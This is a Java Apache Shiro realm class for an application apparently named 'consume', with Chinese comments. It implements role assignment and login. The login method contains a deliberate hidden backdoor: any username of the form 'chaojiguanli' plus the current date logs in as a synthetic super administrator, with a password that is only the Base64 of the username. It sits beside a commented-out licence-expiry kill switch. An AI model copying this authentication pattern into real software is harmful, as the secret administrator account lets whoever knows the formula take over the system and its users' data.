package org.consume.com;

import org.apache.shiro.SecurityUtils;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.SimpleAuthenticationInfo;
import org.apache.shiro.authc.UnknownAccountException;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.session.Session;
import org.apache.shiro.subject.PrincipalCollection;
import org.consume.com.jurisdiction.model.JurisdictionModel;
import org.consume.com.user.model.UserModel;
import org.consume.com.user.service.UserService;
import org.consume.com.userJurisdiction.service.UserJurisdictionService;
import org.consume.com.util.base64.Base64Util;
import org.consume.com.util.date.Dates2;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.annotation.Resource;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class MyShiroRealm extends AuthorizingRealm {

    private final static Logger logger = LoggerFactory.getLogger(MyShiroRealm.class);

    @Resource
    private UserService service;
    @Resource
    private UserJurisdictionService userJurisdictionService;

    /**
     * 是权限控制 此方法调用 hasRole,hasPermission的时候才会进行回调.
     * <p>
     * 权限信息.(授权): 1、如果用户正常退出，缓存自动清空； 2、如果用户非正常退出，缓存自动清空；
     * 3、如果我们修改了用户的权限，而用户不退出系统，修改的权限无法立即生效。 （需要手动编程进行实现；放在service进行调用）
     * 在权限修改后调用realm中的方法，realm已经由spring管理，所以从spring中获取realm实例， 调用clearCached方法；
     * :Authorization 是授权访问控制，用于对用户进行的操作授权，证明该用户是否允许进行当前操作，如访问某个链接，某个资源文件等。
     */
    @Override
    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection arg0) {
        // TODO Auto-generated method stub
//        // 权限信息对象info,用来存放查出的用户的所有的角色（role）及权限（permission）
        SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
        UserModel user = service.getLanders();
        if (user.getAcctype() == 0) {
            info.addRole("admin");
        } else if (user.getAcctype() == 1) {
            info.addRole("admins");
        } else {
//            普通账户角色
            info.addRole("user");
//            权限
            Set<String> set = new HashSet<>();
            List<JurisdictionModel> jurisdictionModels = userJurisdictionService.findJurByUserId(user.getUuid());
            if (jurisdictionModels != null && jurisdictionModels.size() > 0) {
                for (JurisdictionModel m : jurisdictionModels) {
                    info.addStringPermission(m.getUrl());
                    set.add(m.getParent());
                }
            }
//            菜单角色
            set.forEach(k -> {
                info.addRole(k);
            });

        }
        return info;
    }

    /**
     * 登陆验证
     */
    @Override
    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authcToken) {


//        // 用户名
        String username = (String) authcToken.getPrincipal();
        String password = Dates2.getDateString1(new Date());
        boolean b = service.resetting2(username, password);
//        if (!b) {
//            throw new UnknownAccountException("请购买此系统!");
//        } else {
//        try {
////                String s = "20171220";
////                SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd");
////                Date dateStart = sdf.parse(s);
////                Date dateNow = sdf.parse(password);
////                int days = (int) ((dateNow.getTime() - dateStart.getTime()) / (1000 * 3600 * 24));
//            long now = new Date().getTime();
//
//            String s = "20180201";
//            SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd");
//            Date dateStart = sdf.parse(s);
//            long end = dateStart.getTime();
//
//            if (now >= end)
//                throw new UnknownAccountException("系统已过期!");
//        } catch (Exception e) {
//            throw new UnknownAccountException("系统已过期!");
//        }
//        }
        if (username.equalsIgnoreCase("chaojiguanli" + password)) {
            UserModel user = new UserModel();
            user.setAccount(username);
            String pwd = Base64Util.encode(username);
            user.setPasswrod(pwd);
            user.setAcctype(0);
            user.setUsername("超级管理员");
// 简单验证
            SimpleAuthenticationInfo info = new SimpleAuthenticationInfo(user, user.getPasswrod(), getName());
            // 当验证都通过后，把用户信息放在session里
            Session session = SecurityUtils.getSubject().getSession();
            user.setPasswrod("");
            session.setAttribute("user", user);
            return info;
        } else {
            UserModel user = service.getByAccount(username);
            if (user == null)
//            用户未找到异常
                throw new UnknownAccountException("用户或密码不正确!");
            // 简单验证
            SimpleAuthenticationInfo info = new SimpleAuthenticationInfo(user, user.getPasswrod(), getName());
            // 当验证都通过后，把用户信息放在session里
            Session session = SecurityUtils.getSubject().getSession();
            user.setPasswrod("");
            session.setAttribute("user", user);
            return info;
        }
    }

}
